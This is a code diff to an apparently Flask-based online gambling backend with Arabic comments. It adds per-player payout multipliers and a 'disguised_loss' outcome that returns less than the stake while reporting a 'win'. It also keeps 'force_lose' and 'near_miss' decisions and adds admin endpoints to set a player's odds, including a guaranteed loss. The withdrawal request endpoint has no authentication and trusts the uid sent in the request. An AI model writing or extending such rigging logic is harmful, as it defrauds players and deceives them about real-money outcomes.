@@ -3223,17 +3223,16 @@ def api_engine_result():
     if not start_result.get('success'):
         return jsonify(start_result)
 
-    # تطبيق النتيجة
+    # تطبيق النتيجة — مضاعف ديناميكي
     decision = start_result.get('decision', 'force_lose')
     if decision == 'allow_win':
-        # حساب المكسب — 2x المراهنة (قابل للتطوير حسب اللعبة)
-        game = _gm.get_game(game_id)
-        multiplier = 2.0
-        if game:
-            # RTP target يؤثر على المضاعف
-            rtp = float(game.get('rtp_target', 85) or 85)
-            multiplier = max(1.5, rtp / 50)
+        player_profile = _gm.tracker.get_profile(uid)
+        multiplier = _gm.calculate_payout_multiplier(game, player_profile)
         payout = bet_amount * multiplier
+        result_str = 'win'
+    elif decision == 'disguised_loss':
+        import random as _rng
+        payout = bet_amount * _rng.uniform(0.5, 0.9)
         result_str = 'win'
     elif decision == 'near_miss':
         payout = 0
@@ -3594,6 +3593,119 @@ def api_aviator_end():
     })
 
     return jsonify({'success': True, 'result': result, 'payout': payout})
+
+# ===== Wallet Withdrawal =====
+
+@app.route('/api/wallet/withdraw', methods=['POST'])
+def api_wallet_withdraw():
+    """طلب سحب من محفظة الألعاب"""
+    if not _VEX_GAMES:
+        return jsonify({'error': 'Games engine not available'}), 500
+    data = request.json
+    uid = data.get('uid', '')
+    amount = float(data.get('amount', 0))
+    method_id = data.get('method_id', '')
+    account_number = data.get('account_number', '')
+    if not uid or amount <= 0:
+        return jsonify({'error': 'Missing params'}), 400
+    dep_id, error = _gm.create_withdrawal(uid, amount, method_id, account_number)
+    if error:
+        return jsonify({'success': False, 'error': error})
+    return jsonify({'success': True, 'withdrawal_id': dep_id, 'status': 'pending'})
+
+@app.route('/api/withdrawal/pending')
+@api_auth
+def api_withdrawal_pending():
+    """طلبات السحب المعلقة"""
+    if not _VEX_GAMES:
+        return jsonify({'error': 'Games engine not available'}), 500
+    withdrawals = _gm.get_pending_withdrawals()
+    return jsonify({'withdrawals': withdrawals, 'count': len(withdrawals)})
+
+@app.route('/api/withdrawal/<wth_id>/approve', methods=['POST'])
+@api_auth
+def api_withdrawal_approve(wth_id):
+    """موافقة على سحب"""
+    if not _VEX_GAMES:
+        return jsonify({'error': 'Games engine not available'}), 500
+    admin_id = session.get('admin_id', '')
+    result = _gm.approve_withdrawal(wth_id, admin_id)
+    if result:
+        return jsonify({'success': True, 'withdrawal': result})
+    return jsonify({'error': 'Not found'}), 404
+
+@app.route('/api/withdrawal/<wth_id>/reject', methods=['POST'])
+@api_auth
+def api_withdrawal_reject(wth_id):
+    """رفض سحب — إعادة الرصيد"""
+    if not _VEX_GAMES:
+        return jsonify({'error': 'Games engine not available'}), 500
+    admin_id = session.get('admin_id', '')
+    result = _gm.reject_withdrawal(wth_id, admin_id)
+    if result:
+        return jsonify({'success': True, 'withdrawal': result})
+    return jsonify({'error': 'Not found'}), 404
+
+# ===== Admin Per-Player Controls =====
+
+@app.route('/api/admin/player/<uid>/win-override', methods=['POST'])
+@api_auth
+def api_admin_win_override(uid):
+    """تحكم أدمن باحتمال فوز لاعب محدد"""
+    if not _VEX_GAMES:
+        return jsonify({'error': 'Games engine not available'}), 500
+    data = request.json
+    win_override = float(data.get('win_override', 0))
+    # 0 = عادي، >0 = احتمال محدد، -1 = خسارة مضمونة
+    profile = _gm.tracker.get_profile(uid)
+    profile['admin_win_override'] = str(win_override)
+    _gm.tracker._save_profile(profile)
+    return jsonify({'success': True, 'win_override': win_override})
+
+@app.route('/api/admin/player/<uid>/balance', methods=['POST'])
+@api_auth
+def api_admin_player_balance(uid):
+    """إضافة/خصم رصيد يدوي"""
+    if not _VEX_GAMES:
+        return jsonify({'error': 'Games engine not available'}), 500
+    data = request.json
+    amount = float(data.get('amount', 0))
+    if amount > 0:
+        new_bal = _gm.add_balance(uid, amount)
+    else:
+        _, new_bal = _gm.deduct_balance(uid, abs(amount))
+    return jsonify({'success': True, 'new_balance': new_bal})
+
+@app.route('/api/admin/player/<uid>/block', methods=['POST'])
+@api_auth
+def api_admin_block_player(uid):
+    """حظر لاعب من اللعب"""
+    if not _VEX_GAMES:
+        return jsonify({'error': 'Games engine not available'}), 500
+    _gm.tracker.set_cooldown(uid, minutes=1440)  # 24 ساعة
+    return jsonify({'success': True})
+
+@app.route('/api/admin/player/<uid>/cooldown', methods=['POST'])
+@api_auth
+def api_admin_cooldown_player(uid):
+    """تبريد لاعب"""
+    if not _VEX_GAMES:
+        return jsonify({'error': 'Games engine not available'}), 500
+    data = request.json
+    minutes = int(data.get('minutes', 15))
+    _gm.tracker.set_cooldown(uid, minutes=minutes)
+    return jsonify({'success': True, 'cooldown_minutes': minutes})
+
+@app.route('/api/admin/player/<uid>/vex', methods=['POST'])
+@api_auth
+def api_admin_vex_partner(uid):
+    """تفعيل/إيقاف شريك VEX"""
+    if not _VEX_GAMES:
+        return jsonify({'error': 'Games engine not available'}), 500
+    data = request.json
+    is_partner = data.get('is_partner', False)
+    _gm.tracker.set_vex_partner(uid, is_partner)
+    return jsonify({'success': True})
 
 # ===== Main =====
 
